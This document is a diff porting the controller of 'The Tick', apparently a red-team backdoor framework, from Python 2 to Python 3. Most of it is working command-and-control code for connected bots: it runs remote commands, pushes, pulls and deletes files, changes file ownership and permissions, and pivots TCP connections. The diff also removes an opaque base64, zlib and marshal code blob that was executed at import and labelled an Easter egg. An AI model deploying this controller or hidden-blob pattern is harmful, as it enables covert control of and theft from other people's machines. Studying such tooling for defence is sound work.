@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 # -*- coding: utf8 -*-
 
 """
@@ -12,7 +12,6 @@ http://www.github.com/nccgroup/thetick
 
 See the LICENSE file for further details.
 """
-from __future__ import print_function
 
 TICK_VERSION = "0.2"
 
@@ -32,6 +31,7 @@ import ssl
 import posixpath
 import ntpath
 import code
+import errno
 
 # More standard imports...
 from socket import *
@@ -46,9 +46,27 @@ from collections import OrderedDict
 from argparse import ArgumentParser
 from time import sleep
 from functools import wraps
-from multiprocessing import Process
-from subprocess import check_output
+from multiprocessing import Process, Pipe
+from subprocess import check_output, check_call, CalledProcessError
 from collections import namedtuple
+from base64 import b64decode
+
+# Determine how OS level dependencies are installed.
+# We're not actually gonna run this command, it's just for show.
+from platform import platform
+PLATFORM = platform()
+if "Ubuntu" in PLATFORM:
+    APT = "sudo apt install"
+elif "Debian" in PLATFORM:
+    APT = "sudo apt-get install"
+elif "Fedora" in PLATFORM:
+    APT = "dnf install"
+elif "CentOS" in PLATFORM:
+    APT = "yum install"
+elif "RedHat" in PLATFORM:
+    APT = "yum install"
+else:
+    APT = "sudo apt-get install"    # we don't know :(
 
 # This is our first dependency and we check it now so
 # we know if we can use colors to show errors later.
@@ -82,7 +100,7 @@ try:
     from argparse_color_formatter import ColorHelpFormatter
 except ImportError:
     print("Missing dependency: " + Style.BRIGHT + Fore.RED + "argparse_color_formatter" + Style.RESET_ALL)
-    print(Style.BRIGHT + Fore.BLUE + "  pip install argparse-color-formatter" + Style.RESET_ALL)
+    print(Style.BRIGHT + Fore.BLUE + "  pip install -r requirements.txt" + Style.RESET_ALL)
     exit(1)
 
 # ASCII art tables. Of course we need this, why do you ask?
@@ -90,39 +108,42 @@ try:
     from texttable import Texttable
 except ImportError:
     print("Missing dependency: "+ Style.BRIGHT + Fore.RED + "texttable" + Style.RESET_ALL)
-    print(Style.BRIGHT + Fore.BLUE + "  pip install texttable" + Style.RESET_ALL)
+    print(Style.BRIGHT + Fore.BLUE + "  pip install -r requirements.txt" + Style.RESET_ALL)
     exit(1)
 
-# Yeah it's not pythonic to use asserts like that,
-# but an old dog don't learn new tricks, y'know.
-# And also, to be fair, CPython's idea of "optimization"
-# breaks too many things anyway, so let's prevent that too.
+# Ok, this dependency is actually kind of a big deal.
+# Still, let's make it optional and just disable the mount command if missing.
+# That's because we depend on the distro, as it simply cannot be installed from pip.
 try:
-    assert False
-    print("Running with assertions disabled is a " + Style.BRIGHT + Fore.RED + "TERRIBLE IDEA" + Style.RESET_ALL, end=' ')
-    if ANSI_ENABLED:
-        print(" \xf0\x9f\x98\xa0")   # angry face emoji
+    import fuse
+    if not hasattr(fuse, '__version__'):
+        print("Broken dependency: "+ Style.BRIGHT + Fore.RED + "fuse" + Style.RESET_ALL)
+        print("It seems to be an old or incompatible version.")
+        print("We recommend installing the version that comes with your Linux distribution:")
+        print(Style.BRIGHT + Fore.BLUE + "  " + APT + " python3-fuse" + Style.RESET_ALL)
+        HAVE_FUSE = False
     else:
-        print()
-    print("Please don't do that ever again...")
-    exit(1)
-except AssertionError:
-    pass
+        fuse.fuse_python_api = (0, 2)
+        HAVE_FUSE = True
+except ImportError:
+    HAVE_FUSE = False
+    print("Missing dependency: "+ Style.BRIGHT + Fore.RED + "fuse" + Style.RESET_ALL)
+    print(Style.BRIGHT + Fore.BLUE + "  " + APT + " python3-fuse" + Style.RESET_ALL)
 
 ##############################################################################
 # Some good old blobs. Nothing says "trust this code and run it" like blobs.
 
 # Boring banner :(
-BORING_BANNER = """
+BORING_BANNER = b64decode("""
 G1szMm0bWzFt4pWU4pWm4pWXG1syMm3ilKwg4pSs4pSM4pSA4pSQICAbWzFt4pWU4pWm4pWXG1sy
 Mm3ilKzilIzilIDilJDilKzilIzilIAbWzBtChtbMzJtG1sxbSDilZEgG1syMm3ilJzilIDilKTi
 lJzilKQgICAbWzFtIOKVkSAbWzIybeKUguKUgiAg4pSc4pS04pSQG1swbQobWzMybRtbMW0g4pWp
 IBtbMjJt4pS0IOKUtOKUlOKUgOKUmCAgG1sxbSDilakgG1syMm3ilLTilJTilIDilJjilLQg4pS0
 G1swbQo=
-""".decode("base64")
+""").decode("utf8")
 
 # Fun banner :)
-FUN_BANNER = """
+FUN_BANNER = b64decode("""
 ChtbMzFtG1sxbeKWhOKWhOKWhOKWiOKWiOKWiOKWiOKWiBtbMjJt4paTIBtbMW3ilojilogbWzIy
 beKWkSAbWzFt4paI4paIG1syMm0g4paTG1sxbeKWiOKWiOKWiOKWiOKWiCAgICDiloTiloTiloTi
 lojilojilojilojilogbWzIybeKWkyAbWzFt4paI4paIG1syMm3ilpMgG1sxbeKWhOKWiOKWiOKW
@@ -152,115 +173,7 @@ G1syMm0gICAgICAgIOKWkSAgICAgICDilpIg4paR4paRICAgICAgICAbWzJt4paRG1syMm0g4paR
 IOKWkSAgICAgICAgICAgICDilpEgIBtbMjJt4paRG1sybSDilpEgICAgICDilpEgIOKWkSAgIBtb
 MjJtChtbMm0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg4paRICAgICAg
 ICAgICAgICAgG1syMm0KG1swbQ==
-""".decode("base64")
-
-# This is a cute Easter Egg for those of you who read the source code. ;)
-# For the extra paranoid out there: you can just remove this blob, nothing
-# will break. Make sure to wear your favorite tinfoil hat when you do it!
-play = """
-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
-"""
-try:
-    import marshal, types, zlib
-    play = play.decode("base64")
-    play = zlib.decompress(play)
-    play = marshal.loads(play)                      # I know many of you will
-    play = types.FunctionType(play, globals(), "play")    # go "yikes" now xD
-except Exception:
-    del play        # no easter egg for you, sorry :(
-    print_exc()
-#del play   # uncomment to disable
+""").decode("utf8")
 
 ##############################################################################
 # Custom TCP protocol definitions and helper functions.
@@ -307,6 +220,12 @@ CMD_TCP_PIVOT           = BASE_CMD_NET + 2
 CMD_STATUS_OK      = 0x00
 CMD_STATUS_ERROR   = 0xFF
 
+# Response structure for the file_stat call.
+RESP_FILE_STAT = namedtuple('RESP_FILE_STAT', ('dev', 'ino', 'mode', 'nlink', 'uid', 'gid', 'rdev', 'size', 'blksize', 'blocks', 'atime', 'mtime', 'ctime'))
+
+# Response structure for the file_statvfs call.
+RESP_FILE_STATVFS = namedtuple('RESP_FILE_STATVFS', ('type', 'bsize', 'blocks', 'bfree', 'bavail', 'files', 'ffree', 'fsid', 'namelen', 'frsize', 'flags'))
+
 # TCP pivot structure for IPv4.
 # typedef struct              // (all values below in network byte order)
 # {
@@ -326,13 +245,13 @@ def build_pivot_struct(ip, port, from_port = 0):
 # } CMD_HEADER;
 
 # Build the command header structure.
-def build_command(cmd_id, cmd = "", data = ""):
+def build_command(cmd_id, cmd = b"", data = b""):
     cmd_len = len(cmd)
     try:
         data_len = len(data)
     except TypeError:
         data_len = data
-        data = ""
+        data = b""
     return pack("!HHL", cmd_id, cmd_len, data_len) + cmd + data
 
 # Response header.
@@ -345,18 +264,17 @@ def build_command(cmd_id, cmd = "", data = ""):
 # Get only the response header from the socket.
 # Data following the header must be read separately.
 def get_resp_header(sock):
-    status = sock.recv(1)
-    data_len = sock.recv(4)
-    if status == "" or data_len == "":
+    header = sock.recv(5)
+    if len(header) != 5:
         raise BotError("disconnected")
-    status, data_len = unpack("!BL", status + data_len)
+    status, data_len = unpack("!BL", header)
     if status == CMD_STATUS_ERROR:
-        msg = ""
+        msg = b""
         if data_len > 0:
             msg = recvall(sock, data_len)
             if len(msg) != data_len:
                 raise BotError("disconnected")
-        raise BotError(msg)
+        raise BotError(msg.decode("utf8"))
     return data_len
 
 # Skip bytes coming from the bot we don't actually need to read.
@@ -378,7 +296,7 @@ def get_resp_no_data(sock):
 # Read a fixed size block of data from a socket.
 # Caller must ensure to check for errors.
 def recvall(sock, count):
-    buffer = ""
+    buffer = b""
     while len(buffer) < count:
         tmp = sock.recv(min(65536, count - len(buffer)))
         if not tmp:
@@ -405,7 +323,7 @@ def copy_stream(src, dst, count):
     while count > 0:
         buffer = src.read(min(65536, count))
         if not buffer:
-            break
+            raise OSError("broken pipe")
         count = count - len(buffer)
         dst.write(buffer)
 
@@ -526,7 +444,7 @@ class Listener(Thread):
             except Exception:
                 pass
             self.ssl_listen_sock = None
-        for bot in self.bots.values():
+        for bot in list(self.bots.values()):
             if bot.sock is not None:
                 try:
                     bot.sock.shutdown(2)
@@ -544,7 +462,8 @@ class Listener(Thread):
     def run(self):
 
         # Sanity check.
-        assert not self.alive
+        if self.alive:
+            return
 
         # We are running now! Yay! \o/
         self.alive = True
@@ -669,7 +588,8 @@ class BotError(RuntimeError):
 def bot_action(method):
     @wraps(method)
     def wrapper(self, *args, **kwds):
-        assert self.alive
+        if not self.alive:
+            raise Exception("internal error")
         try:
             return method(self, *args, **kwds)
         except KeyboardInterrupt:
@@ -691,7 +611,7 @@ def bot_action(method):
 
 # This class is not exported because I don't see a real reason
 # for a user of this module to manually instance Bot objects.
-class Bot(object):
+class Bot:
     "The Tick bot instance."
 
     def __init__(self, sock, uuid, from_addr):
@@ -762,10 +682,11 @@ class Bot(object):
 
     @bot_action
     def file_pull(self, remote_file, local_file):
-        self.sock.sendall( build_command(CMD_FILE_PULL, remote_file) )
+        self.sock.sendall( build_command(CMD_FILE_PULL, bytes(remote_file + "\0", encoding="utf8")) )
         data_len = get_resp_header(self.sock)
+        print(data_len)
         with open(local_file, "wb") as fd:
-            copy_stream(self.sock.makefile(), fd, data_len)
+            copy_stream(self.sock.makefile(mode="rb", buffering=0), fd, data_len)
 
     @bot_action
     def file_push(self, local_file, remote_file):
@@ -773,102 +694,99 @@ class Bot(object):
             fd.seek(0, 2)
             file_size = fd.tell()
             fd.seek(0, 0)
-            self.sock.sendall( build_command(CMD_FILE_PUSH, remote_file, file_size) )
-            copy_stream(fd, self.sock.makefile(), file_size)
+            self.sock.sendall( build_command(CMD_FILE_PUSH, bytes(remote_file + "\0", encoding="utf8"), file_size) )
+            copy_stream(fd, self.sock.makefile(mode="wb", buffering=0), file_size)
         get_resp_no_data(self.sock)
 
     @bot_action
     def file_unlink(self, remote_file):
-        self.sock.sendall( build_command(CMD_FILE_UNLINK, remote_file) )
+        self.sock.sendall( build_command(CMD_FILE_UNLINK, bytes(remote_file + "\0", encoding="utf8")) )
         get_resp_no_data(self.sock)
 
     @bot_action
     def file_exec(self, command_line):
-        self.sock.sendall( build_command(CMD_FILE_EXEC, command_line) )
+        self.sock.sendall( build_command(CMD_FILE_EXEC, bytes(command_line + "\0", encoding="utf8")) )
         return get_resp_with_data(self.sock)
 
     @bot_action
     def file_chmod(self, remote_file, mode_flags = 0o777):
-        self.sock.sendall( build_command(CMD_FILE_CHMOD, pack("!H", mode_flags) + remote_file) )
+        self.sock.sendall( build_command(CMD_FILE_CHMOD, pack("!H", mode_flags) + bytes(remote_file + "\0", encoding="utf8")) )
         get_resp_no_data(self.sock)
 
     @bot_action
     def file_open(self, remote_file, flags = os.O_RDWR, mode = 0o777):
-        self.sock.sendall( build_command(CMD_FILE_OPEN, pack("!H", flags) + pack("!H", mode) + remote_file) )
+        self.sock.sendall( build_command(CMD_FILE_OPEN, pack("!H", flags) + pack("!H", mode) + bytes(remote_file + "\0", encoding="utf8")) )
         resp = get_resp_with_data(self.sock)
         return unpack("!H", resp)[0]
 
     @bot_action
     def file_read(self, remote_file, size, offset = 0):
-        self.sock.sendall( build_command(CMD_FILE_READ, pack("!L", size) + pack("!L", offset) + remote_file) )
+        self.sock.sendall( build_command(CMD_FILE_READ, pack("!L", size) + pack("!L", offset) + bytes(remote_file + "\0", encoding="utf8")) )
         return get_resp_with_data(self.sock)
 
     @bot_action
     def file_write(self, remote_file, data, offset = 0):
-        self.sock.sendall( build_command(CMD_FILE_WRITE, pack("!L", offset) + remote_file, data) )
+        self.sock.sendall( build_command(CMD_FILE_WRITE, pack("!L", offset) + bytes(remote_file + "\0", encoding="utf8"), data) )
         get_resp_no_data(self.sock)     # TODO review this
 
     @bot_action
     def file_stat(self, remote_path):
-        self.sock.sendall( build_command(CMD_FILE_STAT, remote_path) )
+        self.sock.sendall( build_command(CMD_FILE_STAT, bytes(remote_path + "\0", encoding="utf8")) )
         data = get_resp_with_data(self.sock)
-        resp = namedtuple('RESP_FILE_STAT', ('dev', 'ino', 'mode', 'nlink', 'uid', 'gid', 'rdev', 'size', 'blksize', 'blocks', 'atime', 'mtime', 'ctime'))
-        return resp(*(unpack("!QQQQQQQQQQQQQ", data)))
+        return RESP_FILE_STAT(*(unpack("!QQQQQQQQQQQQQ", data)))
 
     @bot_action
     def file_readdir(self, remote_path):
-        self.sock.sendall( build_command(CMD_FILE_READDIR, remote_path) )
-        data = get_resp_with_data(self.sock).split("\0")
-        while "" in data:
-            data.remove("")
+        self.sock.sendall( build_command(CMD_FILE_READDIR, bytes(remote_path + "\0", encoding="utf8")) )
+        data = get_resp_with_data(self.sock)
+        data = [x for x in data.split(b"\0") if x]
         return data
 
     @bot_action
     def file_readlink(self, remote_file):
-        self.sock.sendall( build_command(CMD_FILE_READLINK, remote_file) )
+        self.sock.sendall( build_command(CMD_FILE_READLINK, bytes(remote_file + "\0", encoding="utf8")) )
         return get_resp_with_data(self.sock)
 
     @bot_action
     def file_symlink(self, linkname, target):
-        self.sock.sendall( build_command(CMD_FILE_SYMLINK, linkname, target) )
+        self.sock.sendall( build_command(CMD_FILE_SYMLINK, bytes(linkname + "\0", encoding="utf8"), bytes(target + "\0", encoding="utf8")) )
         get_resp_no_data(self.sock)
 
     @bot_action
     def file_link(self, linkname, target):
-        self.sock.sendall( build_command(CMD_FILE_LINK, linkname, target) )
+        self.sock.sendall( build_command(CMD_FILE_LINK, bytes(linkname + "\0", encoding="utf8"), bytes(target + "\0", encoding="utf8")) )
         get_resp_no_data(self.sock)
 
     @bot_action
     def file_rmdir(self, remote_path):
-        self.sock.sendall( build_command(CMD_FILE_RMDIR, remote_path) )
+        self.sock.sendall( build_command(CMD_FILE_RMDIR, bytes(remote_path + "\0", encoding="utf8")) )
         get_resp_no_data(self.sock)
 
     @bot_action
     def file_mkdir(self, remote_path):
-        self.sock.sendall( build_command(CMD_FILE_MKDIR, remote_path) )
+        self.sock.sendall( build_command(CMD_FILE_MKDIR, bytes(remote_path + "\0", encoding="utf8")) )
         get_resp_no_data(self.sock)
 
     @bot_action
     def file_chown(self, remote_file, uid = 0, gid = 0):
-        self.sock.sendall( build_command(CMD_FILE_CHOWN, pack("!L", uid) + pack("!L", gid) + remote_file) )
+        self.sock.sendall( build_command(CMD_FILE_CHOWN, pack("!L", uid) + pack("!L", gid) + bytes(remote_file + "\0", encoding="utf8")) )
         get_resp_no_data(self.sock)
 
     @bot_action
     def file_access(self, remote_file, mode_flags = 0o777):
-        self.sock.sendall( build_command(CMD_FILE_ACCESS, pack("!H", mode_flags) + remote_file) )
+        self.sock.sendall( build_command(CMD_FILE_ACCESS, pack("!H", mode_flags) + bytes(remote_file + "\0", encoding="utf8")) )
         try:
             get_resp_no_data(self.sock)
             return True
-        except BotError, e:
+        except BotError as e:
             if e.msg == "":
                 return False
             raise
 
     @bot_action
     def file_statvfs(self, remote_path):
-        self.sock.sendall( build_command(CMD_FILE_STATVFS, remote_path) )
+        self.sock.sendall( build_command(CMD_FILE_STATVFS, bytes(remote_path + "\0", encoding="utf8")) )
         data = get_resp_with_data(self.sock)
-        resp = namedtuple('RESP_FILE_STAT', ('type', 'bsize', 'blocks', 'bfree', 'bavail', 'files', 'ffree', 'fsid', 'namelen', 'frsize', 'flags'))
         left = data[:7*8]
         middle = data[7*8:9*8]
         right = data[9*8:]
@@ -876,15 +794,15 @@ class Bot(object):
         joined.extend(unpack("!QQQQQQQ", left))
         joined.append(middle)
         joined.extend(unpack("!QQQ", right))
-        return resp(*joined)
+        return RESP_FILE_STATVFS(*joined)
 
     @bot_action
     def dns_resolve(self, domain):
-        self.sock.sendall( build_command(CMD_DNS_RESOLVE, domain) )
+        self.sock.sendall( build_command(CMD_DNS_RESOLVE, bytes(domain + "\0", encoding="utf8")) )
         response = get_resp_with_data(self.sock)
         answer = []
         while response:
-            family, = unpack("!B", response[0])
+            family = response[0]    # automatic conversion to integer
             if family == AF_INET:
                 addr = response[1:5]
                 response = response[5:]
@@ -892,7 +810,7 @@ class Bot(object):
